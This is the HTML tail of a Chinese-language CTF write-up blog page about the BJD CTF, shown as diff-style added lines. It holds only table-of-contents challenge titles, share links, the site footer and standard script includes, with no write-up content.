class="toc-text">cat flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%88%E8%83%BD%E7%B2%BE%E9%80%9A"><span class="toc-number">3.13.</span> <span class="toc-text">靈能精通</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y1nglish"><span class="toc-number">3.14.</span> <span class="toc-text">Y1nglish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schro%CC%88dinger"><span class="toc-number">3.15.</span> <span class="toc-text">Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#duangShell"><span class="toc-number">3.16.</span> <span class="toc-text">duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E8%B1%AC%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">3.17.</span> <span class="toc-text">假豬套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-google"><span class="toc-number">3.18.</span> <span class="toc-text">fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E5%96%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">3.19.</span> <span class="toc-text">簡單注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#old-hack"><span class="toc-number">3.20.</span> <span class="toc-text">old-hack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-MD5"><span class="toc-number">3.21.</span> <span class="toc-text">Easy MD5</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/95dd4451.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&text=某萌新的 BJD CTF Online 之旅"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&is_video=false&description=某萌新的 BJD CTF Online 之旅"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=某萌新的 BJD CTF Online 之旅&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/95dd4451.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&name=某萌新的 BJD CTF Online 之旅&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&t=某萌新的 BJD CTF Online 之旅"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
